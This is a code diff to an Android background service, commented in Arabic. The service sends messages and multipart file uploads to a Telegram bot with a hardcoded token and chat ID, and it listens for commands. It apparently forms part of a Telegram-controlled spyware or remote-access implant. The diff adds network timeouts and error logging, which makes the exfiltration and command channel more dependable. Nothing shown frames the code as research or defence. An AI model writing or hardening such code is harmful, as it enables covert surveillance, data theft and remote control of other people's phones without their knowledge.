@@ -59,6 +59,7 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        // إرسال الإشعار الأولي فوراً في الخلفية
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -66,6 +67,7 @@ public class BackgroundService extends Service {
             }
         }).start();
 
+        // بدء الاستماع للأوامر
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -95,6 +97,8 @@ public class BackgroundService extends Service {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
@@ -136,7 +140,9 @@ public class BackgroundService extends Service {
             os.close();
             conn.getResponseCode();
             conn.disconnect();
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     private void checkUpdates() {
@@ -258,6 +264,8 @@ public class BackgroundService extends Service {
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
             conn.getResponseCode();
             conn.disconnect();
         } catch (Exception e) {}
@@ -273,6 +281,8 @@ public class BackgroundService extends Service {
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
+            conn.setConnectTimeout(30000);
+            conn.setReadTimeout(30000);
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
@@ -304,6 +314,8 @@ public class BackgroundService extends Service {
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
+            conn.setConnectTimeout(30000);
+            conn.setReadTimeout(60000);
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
 
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
